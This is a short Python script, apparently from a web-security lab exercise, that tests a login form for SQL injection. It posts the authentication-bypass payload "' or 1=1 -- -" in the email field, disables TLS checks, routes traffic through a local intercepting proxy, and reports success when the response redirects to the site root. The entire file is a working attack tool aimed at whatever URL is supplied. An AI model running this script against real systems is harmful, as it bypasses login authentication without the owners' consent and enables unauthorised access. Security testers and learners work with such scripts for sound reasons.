import requests
import sys
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit(url):
    sql_payload = "dd@gg.com' or 1=1 -- -"
    data = {"email": sql_payload, "password": 000}
    r = requests.post(url, verify=False, data=data,
                      proxies=proxies, allow_redirects=False)
    if r.status_code in [301, 302]:
        if r.headers["Location"] == "/":
            sys.stdout.write("\n")
            sys.stdout.write("\t[+] SQLI Found")
            sys.exit()
    sys.stdout.flush()
    sys.stdout.write('\n')
    sys.stdout.write("\t No SQLi Found")
    sys.stdout.write('\n')


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    exploit(url)
